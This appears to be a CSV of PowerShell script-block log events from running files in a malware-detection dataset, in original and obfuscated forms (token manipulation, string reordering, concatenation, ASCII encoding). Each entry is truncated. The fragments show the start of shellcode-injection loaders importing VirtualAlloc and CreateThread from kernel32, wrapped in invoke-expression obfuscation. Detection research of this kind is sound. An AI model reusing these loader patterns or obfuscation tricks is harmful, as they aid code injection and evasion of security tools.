"8/6/2026 9:58:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:49 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1348.ps1","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1340.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:33 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:33 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1340.ps1","2893","(((""{43}{36}{41}{24}{45}{30}{13}{21}{3}{23}{0}{1}{19}{17}{48}{40}{27}{8}{12}{29}{6}{5}{33}{11}{38}{7}{26}{46}{44}{39}{15}{20}{25}{2}{47}{9}{28}{18}{16}{4}{37}{32}{22}{34}{35}{31}{10}{42}{14}"" -f 'asst"
"8/6/2026 9:58:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:25 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1340.ps1","2707","invOke-ExPREsSIoN ((('3GJc = zeW'+'[DllImport(rJekernel32.dl'+'lrJe)]public static ext'+'ern IntPtr VirtualAlloc(IntPtr lpAddress, uint '+'dwSize'+', uint flAllocationType, uint flProtect);[DllImport("
"8/6/2026 9:58:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:17 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1340.ps1","23","{ ( [inT]$_ -As[cHar])}"
"8/6/2026 9:58:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1340.ps1","7996","&( $SHellid[1]+$SHELliD[13]+'x') ([stRinG]::JoIN( '' , ( '36D99x32&61b32U39D91x68t108x108b73U109t112D111>114&116D40r34U107>101U114x110D101t108n51a50t46r100D108b108x34&41t93x112r117U98n108n105U99&32t11"
"8/6/2026 9:58:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1340.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1305.ps1","2347","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:53 AM","","2340","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1305.ps1","3048"," (((""{47}{9}{27}{51}{68}{19}{14}{46}{41}{38}{49}{60}{35}{61}{34}{53}{63}{1}{44}{39}{36}{11}{72}{69}{3}{31}{50}{43}{33}{12}{62}{32}{66}{6}{13}{59}{57}{37}{54}{71}{21}{29}{22}{58}{10}{17}{70}{7}{4}{45}{"
"8/6/2026 9:57:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:45 AM","","2340","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1305.ps1","2759","& ( $eNV:comspeC[4,24,25]-join'') ( ('xK18KN8nB = tR8[DllImport(hmakernel32.dllhma)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocati'+'onType, uint flProtect);'+"
"8/6/2026 9:57:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:37 AM","","2340","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1305.ps1","23","{( [iNT] $_-AS[CHAr]) }"
"8/6/2026 9:57:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1305.ps1","7972","-Join ( '36T56T75,78T56,110D66R32G61~32Q39k91~68,108,108R73k109,112R111Q114G116D40T34Q107k101,114R110X101G108Q51G50T46X100Q108D108~34k41T93D112D117~98R108X105D99,32k115Z116D97Q116~105X99k32Z101~120k11"
"8/6/2026 9:57:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1305.ps1","2340","$8KN8nB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:57:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\13.ps1","2252","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:57:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:12 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:57:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\13.ps1","2788"," ((""{45}{27}{34}{8}{25}{10}{1}{41}{30}{21}{35}{5}{40}{15}{20}{28}{22}{38}{13}{6}{18}{14}{24}{37}{26}{46}{36}{16}{29}{7}{42}{0}{31}{33}{23}{9}{44}{11}{32}{2}{12}{17}{43}{19}{39}{4}{3}""-f 'f,0xd5,0x97,0"
"8/6/2026 9:57:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:57:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:57:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:57:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:57:04 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:57:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\13.ps1","2678",". ( $ENV:coMSPeC[4,24,25]-joIn'')((('y7zc = YBg[DllImport(iC'+'wkernel32.dlliCw)]public static extern IntPtr'+' VirtualAll'+'oc(IntPtr lpAd'+'dress, uint dwSize, uint flAll'+'ocationType, uint flProte"
"8/6/2026 9:56:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:56 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","19","{([CHar] [iNT] $_)}"
"8/6/2026 9:56:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","7664","[stRIng]::joIn('' ,('36b99k32P61A32P39Z91v68&108_108b73k109P112_111b114Z116v40b34Z107v101_114I110A101F108b51v50_46Z100b108_108b34k41F93_112b117Z98A108P105_99k32Z115A116I97&116b105F99P32I101_120I116Z10"
"8/6/2026 9:56:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\13.ps1","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1299.ps1","2328","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:32 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1299.ps1","3102","& ( $PShoME[4]+$PShoME[34]+'x') ( ((""{44}{39}{14}{48}{3}{61}{15}{22}{1}{51}{28}{33}{34}{40}{24}{69}{49}{23}{21}{58}{71}{45}{32}{19}{64}{7}{12}{36}{31}{63}{66}{2}{62}{41}{47}{38}{20}{0}{10}{50}{65}{13}"
"8/6/2026 9:56:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:24 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1299.ps1","2698"," .( $eNv:COMSpEc[4,24,25]-JoIN'') ((('jhmc '+'= DkF[DllImport(1zykernel32.dll1zy)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImp"
"8/6/2026 9:56:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:16 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1299.ps1","21","{([INt]$_-As [chAr])}"
"8/6/2026 9:56:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1299.ps1","7912","& ((gv '*MdR*').nAmE[3,11,2]-JOIN'')( -jOIN ( '36O99Q32>61m32@39@91Q68R108J108@73B109J112>111B114O116Q40R34O107Q101Q114J110B101Q108m51J50R46>100B108x108O34x41;93m112Q117J98Q108>105R99@32@115>116B97Q11"
"8/6/2026 9:56:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1299.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:56:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:56:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:56:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:56:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:56:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1296.ps1","2339","$oTvt = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:55:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:55:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:55:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:55:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:55:52 AM","","2333","$oTvt = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:55:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1296.ps1","3070"," . ( ([StRiNG]$verBoSEpREfERenCe)[1,3]+'X'-JOIn'') ( ((""{64}{44}{72}{21}{38}{67}{71}{36}{6}{60}{0}{13}{12}{59}{29}{48}{53}{51}{18}{26}{31}{34}{39}{46}{61}{10}{33}{22}{50}{19}{47}{69}{66}{45}{35}{70}{5"
"8/6/2026 9:55:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:55:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:55:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:55:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:55:44 AM","","2333","$oTvt = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:55:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1296.ps1","2724"," .( $pshome[4]+$pshOMe[30]+'X')( ('cONoTvt = yoY[DllImport(WjSke'+'rnel32.dllWjS)]pub'+'lic static extern IntPtr VirtualAll'+'oc(In'+'tPtr lpAddress, uint dwS'+'ize, uint flAllocationType, uint flProt"
"8/6/2026 9:55:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:55:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:55:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:55:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:55:36 AM","","2335","$oTvt = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:55:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1296.ps1","10286","""$( Set  'ofs' '' )""+[STRIng][cHAR[]]( 36 , 111 ,84,118 , 116 , 32, 61 ,32 , 39 ,91 ,68, 108,108 , 73,109, 112 , 111, 114, 116 ,40 , 34,107,101 ,114 , 110 ,101,108 ,51, 50,46,100, 108, 108 ,34 ,41 ,93"
"8/6/2026 9:55:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:55:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:55:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:55:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:55:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1296.ps1","2333","$oTvt = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:55:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:55:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:55:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:55:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:55:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1286.ps1","2452","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:55:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:55:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:55:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:55:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:55:12 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:55:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1286.ps1","3170","iex (((""{10}{55}{50}{1}{49}{62}{22}{58}{54}{19}{44}{9}{4}{20}{64}{30}{70}{51}{16}{75}{24}{6}{27}{17}{12}{32}{59}{21}{53}{43}{69}{18}{3}{2}{73}{40}{71}{8}{33}{42}{34}{5}{13}{52}{29}{25}{68}{57}{63}{7}{"
"8/6/2026 9:55:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:55:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:55:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:55:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:55:04 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:55:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1286.ps1","2875"," . ( $ShELLID[1]+$SHeLLId[13]+'x') (('Q'+'cbc = 4hI'+'[DllImport(WxEkernel32.dllWxE)]public static extern '+'IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSiz'+'e, uint flAllocationType, uint'+' flProt"
"8/6/2026 9:54:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:54:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:54:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:54:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:54:56 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:54:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1286.ps1","23","{( [Int]$_ -As[CHAr]) }"
"8/6/2026 9:54:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1286.ps1","8300","& ( $ShEllid[1]+$SheLLID[13]+'X') (('36y99!32h61!32h39J91O68O108E108i73_109i112!111i114y116h40h34!107y101O114i110x101C108h51!50y46E100h108C108i34y41C93C112i117y98i108O105x99C32_115i116O97y116C105x99!3"
"8/6/2026 9:54:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:54:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:54:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:54:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:54:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1286.ps1","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:54:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:54:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:54:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:54:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
